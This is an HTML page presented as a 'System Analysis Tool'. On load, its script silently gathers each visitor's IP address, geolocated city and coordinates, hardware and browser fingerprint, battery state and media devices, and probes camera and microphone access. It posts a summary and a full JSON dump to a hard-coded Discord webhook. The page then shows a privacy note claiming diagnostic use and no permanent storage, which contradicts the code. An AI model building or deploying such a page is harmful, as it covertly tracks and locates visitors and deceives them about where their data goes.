<!DOCTYPE html>
<html>
<head>
    <title>üîç System Analysis Tool</title>
    <style>
        :root {
            --primary: #4a6bdf;
            --secondary: #ff6b6b;
        }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            margin: 0;
            padding: 20px;
            color: #2d3748;
            min-height: 100vh;
        }
        .container {
            background: white;
            border-radius: 16px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            max-width: 900px;
            margin: 0 auto;
        }
        h1 {
            color: var(--primary);
            font-size: 2.8rem;
            margin-bottom: 10px;
            text-align: center;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .emoji-header {
            font-size: 3rem;
            margin: 20px 0;
            text-align: center;
            animation: pulse 2s infinite;
        }
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .info-card {
            background: white;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
            border-top: 4px solid var(--primary);
            transition: transform 0.3s;
        }
        .info-card:hover {
            transform: translateY(-5px);
        }
        .info-card h3 {
            margin-top: 0;
            color: var(--primary);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .info-card h3 span {
            font-size: 1.3em;
        }
        .data-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            padding-bottom: 8px;
            border-bottom: 1px solid #eee;
        }
        .data-label {
            font-weight: 600;
            color: #4a5568;
        }
        .data-value {
            color: #2d3748;
            text-align: right;
            max-width: 60%;
            word-break: break-word;
        }
        .privacy-note {
            font-size: 0.85rem;
            color: #718096;
            text-align: center;
            margin-top: 30px;
            padding: 15px;
            background: #f8fafc;
            border-radius: 8px;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(74, 107, 223, 0.3);
            border-radius: 50%;
            border-top-color: var(--primary);
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>System Analysis</h1>
        <div class="emoji-header">üîçüñ•Ô∏èüìä</div>
        <div id="status">
            <div style="text-align: center;">
                <div class="loading" style="margin: 0 auto;"></div>
                <p>Collecting advanced system information...</p>
            </div>
        </div>
    </div>

    <script>
        // Main function to collect all data
        async function collectAllData() {
            const startTime = performance.now();
            
            // 1. Basic Network Info
            const networkInfo = await getNetworkInfo();
            
            // 2. System Hardware Info
            const hardwareInfo = getHardwareInfo();
            
            // 3. Browser/Software Info
            const softwareInfo = getSoftwareInfo();
            
            // 4. Screen/Display Info
            const displayInfo = getDisplayInfo();
            
            // 5. Location/Geo Info
            const geoInfo = await getGeoInfo(networkInfo.ip);
            
            // 6. Advanced APIs Info
            const advancedInfo = await getAdvancedInfo();
            
            // 7. Connection Info
            const connectionInfo = getConnectionInfo();
            
            // 8. Storage Info
            const storageInfo = getStorageInfo();
            
            // 9. Media Devices Info
            const mediaInfo = await getMediaInfo();
            
            // 10. WebGL/GPU Info
            const graphicsInfo = getGraphicsInfo();
            
            const collectionTime = (performance.now() - startTime).toFixed(2);
            
            // Prepare complete data package
            const allData = {
                metadata: {
                    collectionTime: `${collectionTime}ms`,
                    timestamp: new Date().toISOString()
                },
                network: networkInfo,
                hardware: hardwareInfo,
                software: softwareInfo,
                display: displayInfo,
                geo: geoInfo,
                advanced: advancedInfo,
                connection: connectionInfo,
                storage: storageInfo,
                media: mediaInfo,
                graphics: graphicsInfo
            };
            
            // Send to Discord
            await sendToDiscord(allData);
            
            // Display to user
            displayResults(allData);
        }
        
        // ===== Data Collection Functions =====
        
        async function getNetworkInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                return {
                    ip: ipData.ip,
                    referrer: document.referrer || "Direct visit",
                    onlineStatus: navigator.onLine,
                    connection: navigator.connection ? {
                        type: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    } : null
                };
            } catch (error) {
                console.error("Network info error:", error);
                return { error: "Failed to get network info" };
            }
        }
        
        function getHardwareInfo() {
            return {
                platform: navigator.platform,
                deviceMemory: navigator.deviceMemory || "Unknown",
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints,
                cpuClass: navigator.cpuClass || "Unknown"
            };
        }
        
        function getSoftwareInfo() {
            const userAgent = navigator.userAgent;
            
            // Browser detection
            let browser = "Unknown";
            let version = "Unknown";
            const browserMatch = userAgent.match(/(firefox|chrome|safari|opera|edge|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
            if (browserMatch.length >= 3) {
                browser = browserMatch[1];
                version = browserMatch[2];
            }
            
            // OS detection
            let os = "Unknown";
            if (userAgent.includes("Windows")) os = "Windows";
            else if (userAgent.includes("Mac")) os = "MacOS";
            else if (userAgent.includes("Linux")) os = "Linux";
            else if (userAgent.includes("Android")) os = "Android";
            else if (userAgent.includes("iOS")) os = "iOS";
            
            return {
                browser: browser,
                version: version,
                os: os,
                userAgent: userAgent,
                languages: navigator.languages,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                webdriver: navigator.webdriver || false
            };
        }
        
        function getDisplayInfo() {
            return {
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation ? screen.orientation.type : "Unknown"
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight,
                    devicePixelRatio: window.devicePixelRatio
                },
                visualViewport: window.visualViewport ? {
                    width: window.visualViewport.width,
                    height: window.visualViewport.height,
                    scale: window.visualViewport.scale
                } : null
            };
        }
        
        async function getGeoInfo(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                
                return {
                    ip: ip,
                    city: data.city || "Unknown",
                    region: data.region || "Unknown",
                    country: data.country_name || "Unknown",
                    countryCode: data.country_code || "Unknown",
                    postal: data.postal || "Unknown",
                    latitude: data.latitude || "Unknown",
                    longitude: data.longitude || "Unknown",
                    timezone: data.timezone || "Unknown",
                    currency: data.currency || "Unknown",
                    asn: data.asn || "Unknown",
                    org: data.org || "Unknown"
                };
            } catch (error) {
                console.error("Geo info error:", error);
                return { error: "Failed to get geo info" };
            }
        }
        
        async function getAdvancedInfo() {
            const results = {};
            
            // Battery API
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    results.battery = {
                        level: Math.round(battery.level * 100) + "%",
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    results.battery = { error: e.message };
                }
            } else {
                results.battery = { available: false };
            }
            
            // Bluetooth API
            results.bluetoothAvailable = 'bluetooth' in navigator;
            
            // Clipboard API
            results.clipboardAvailable = 'clipboard' in navigator;
            
            // Geolocation API
            results.geolocationAvailable = 'geolocation' in navigator;
            
            // Notifications API
            results.notificationsAvailable = 'Notification' in window;
            
            // Vibration API
            results.vibrationAvailable = 'vibrate' in navigator;
            
            return results;
        }
        
        function getConnectionInfo() {
            if (!navigator.connection) return { available: false };
            
            return {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink + " Mbps",
                rtt: navigator.connection.rtt + " ms",
                saveData: navigator.connection.saveData,
                onchange: navigator.connection.onchange !== null
            };
        }
        
        function getStorageInfo() {
            return {
                cookies: navigator.cookieEnabled,
                localStorage: 'localStorage' in window,
                sessionStorage: 'sessionStorage' in window,
                indexedDB: 'indexedDB' in window,
                caches: 'caches' in window,
                storageEstimate: 'storage' in navigator ? "Available" : "Not available"
            };
        }
        
        async function getMediaInfo() {
            const results = {};
            
            // Media Devices
            if ('mediaDevices' in navigator) {
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    results.devices = devices.map(d => ({
                        kind: d.kind,
                        type: d.deviceId === '' ? 'Default' : 'Specific',
                        label: d.label || 'Unknown'
                    }));
                    
                    // Microphone test
                    results.microphone = await testMicrophone();
                    
                    // Camera test
                    results.camera = await testCamera();
                } catch (e) {
                    results.error = e.message;
                }
            } else {
                results.available = false;
            }
            
            return results;
        }
        
        async function testMicrophone() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                stream.getTracks().forEach(track => track.stop());
                return { available: true };
            } catch (e) {
                return { available: false, error: e.message };
            }
        }
        
        async function testCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const capabilities = track.getCapabilities ? track.getCapabilities() : {};
                const settings = track.getSettings ? track.getSettings() : {};
                stream.getTracks().forEach(track => track.stop());
                
                return {
                    available: true,
                    capabilities: capabilities,
                    settings: settings
                };
            } catch (e) {
                return { available: false, error: e.message };
            }
        }
        
        function getGraphicsInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return { webgl: "Not supported" };
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                webgl: "Supported",
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown",
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unknown",
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                shaderPrecision: {
                    float: gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT),
                    int: gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_INT)
                }
            };
        }
        
        // ===== Discord Integration =====
        
        async function sendToDiscord(data) {
            const webhookURL = 'https://discord.com/api/webhooks/1372171027890835487/7i0kGhrX1wCbCZhaDeWnsq3Dceo5wjZ3brTY3MXpLpBW97ktk2p8aVcUWmFAphtoJabn';
            
            if (!webhookURL.includes('discord.com')) {
                console.error("Invalid webhook URL");
                return;
            }
            
            try {
                // Create a condensed version for Discord
                const discordData = {
                    content: `üöÄ **New System Scan** at ${new Date().toLocaleString()}`,
                    embeds: [{
                        title: "System Information Summary",
                        color: 0x4a6bdf,
                        fields: [
                            { name: "üåê Network", value: `IP: ${data.network.ip}\nType: ${data.network.connection?.type || 'Unknown'}\nASN: ${data.geo.asn || 'Unknown'}`, inline: true },
                            { name: "üìç Location", value: `${data.geo.city}, ${data.geo.country}\n(${data.geo.latitude}, ${data.geo.longitude})`, inline: true },
                            { name: "üñ•Ô∏è Hardware", value: `OS: ${data.software.os}\nCPU: ${data.hardware.hardwareConcurrency} cores\nRAM: ${data.hardware.deviceMemory}GB`, inline: true },
                            { name: "üß≠ Browser", value: `${data.software.browser} v${data.software.version}\n${data.software.userAgent.substring(0, 50)}...`, inline: true },
                            { name: "üñ•Ô∏è Display", value: `${data.display.screen.width}x${data.display.screen.height}\n${data.display.window.devicePixelRatio}x scaling`, inline: true },
                            { name: "üîã Battery", value: data.advanced.battery?.level || 'N/A', inline: true },
                            { name: "üìä Collection Time", value: `${data.metadata.collectionTime}`, inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };
                
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordData)
                });
                
                // Send full data as a file attachment (if needed)
                const fullDataBlob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
                const formData = new FormData();
                formData.append('file', fullDataBlob, `system-scan-${Date.now()}.json`);
                
                await fetch(webhookURL, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                console.error("Discord send error:", error);
            }
        }
        
        // ===== UI Display =====
        
        function displayResults(data) {
            let html = `
                <div class="emoji-header">üìä‚úÖ</div>
                <h2 style="text-align: center; color: var(--primary);">System Analysis Complete</h2>
                <div class="info-grid">
                    <div class="info-card">
                        <h3><span>üåê</span> Network</h3>
                        ${createDataRow("IP Address", data.network.ip)}
                        ${createDataRow("Connection Type", data.network.connection?.type || "Unknown")}
                        ${createDataRow("Download Speed", data.network.connection?.downlink ? data.network.connection.downlink + " Mbps" : "Unknown")}
                        ${createDataRow("Latency", data.network.connection?.rtt ? data.network.connection.rtt + " ms" : "Unknown")}
                        ${createDataRow("Online Status", data.network.onlineStatus ? "Online" : "Offline")}
                    </div>
                    
                    <div class="info-card">
                        <h3><span>üìç</span> Location</h3>
                        ${createDataRow("City", data.geo.city)}
                        ${createDataRow("Region", data.geo.region)}
                        ${createDataRow("Country", data.geo.country)}
                        ${createDataRow("Coordinates", `${data.geo.latitude}, ${data.geo.longitude}`)}
                        ${createDataRow("Timezone", data.geo.timezone)}
                        ${createDataRow("ISP", data.geo.org || "Unknown")}
                    </div>
                    
                    <div class="info-card">
                        <h3><span>üñ•Ô∏è</span> Hardware</h3>
                        ${createDataRow("Platform", data.hardware.platform)}
                        ${createDataRow("CPU Cores", data.hardware.hardwareConcurrency)}
                        ${createDataRow("Device Memory", data.hardware.deviceMemory + " GB")}
                        ${createDataRow("Max Touch Points", data.hardware.maxTouchPoints)}
                        ${createDataRow("CPU Class", data.hardware.cpuClass)}
                    </div>
                    
                    <div class="info-card">
                        <h3><span>üß≠</span> Browser</h3>
                        ${createDataRow("Browser", data.software.browser)}
                        ${createDataRow("Version", data.software.version)}
                        ${createDataRow("OS", data.software.os)}
                        ${createDataRow("Languages", data.software.languages.join(", "))}
                        ${createDataRow("Cookies", data.software.cookiesEnabled ? "Enabled" : "Disabled")}
                        ${createDataRow("Do Not Track", data.software.doNotTrack || "Not set")}
                    </div>
                    
                    <div class="info-card">
                        <h3><span>üñ•Ô∏è</span> Display</h3>
                        ${createDataRow("Screen Size", `${data.display.screen.width}x${data.display.screen.height}`)}
                        ${createDataRow("Color Depth", data.display.screen.colorDepth + " bits")}
                        ${createDataRow("Pixel Ratio", data.display.window.devicePixelRatio)}
                        ${createDataRow("Orientation", data.display.screen.orientation || "Unknown")}
                        ${createDataRow("Viewport Size", `${data.display.window.innerWidth}x${data.display.window.innerHeight}`)}
                    </div>
                    
                    <div class="info-card">
                        <h3><span>‚ö°</span> Advanced</h3>
                        ${createDataRow("Battery Level", data.advanced.battery?.level || "N/A")}
                        ${createDataRow("Charging", data.advanced.battery?.charging ? "Yes" : "No")}
                        ${createDataRow("Bluetooth", data.advanced.bluetoothAvailable ? "Available" : "Not available")}
                        ${createDataRow("Geolocation", data.advanced.geolocationAvailable ? "Available" : "Not available")}
                        ${createDataRow("WebGL", data.graphics.webgl)}
                        ${createDataRow("GPU", data.graphics.renderer || "Unknown")}
                    </div>
                </div>
                
                <div class="privacy-note">
                    <p>This tool collected system information for diagnostic purposes. No personal data is stored permanently.</p>
                    <p>Collection time: ${data.metadata.collectionTime} | Timestamp: ${new Date(data.metadata.timestamp).toLocaleString()}</p>
                </div>
            `;
            
            document.getElementById('status').innerHTML = html;
        }
        
        function createDataRow(label, value) {
            return `
                <div class="data-row">
                    <span class="data-label">${label}</span>
                    <span class="data-value">${value}</span>
                </div>
            `;
        }
        
        // Start the collection
        window.onload = collectAllData;
    </script>
</body>
</html>
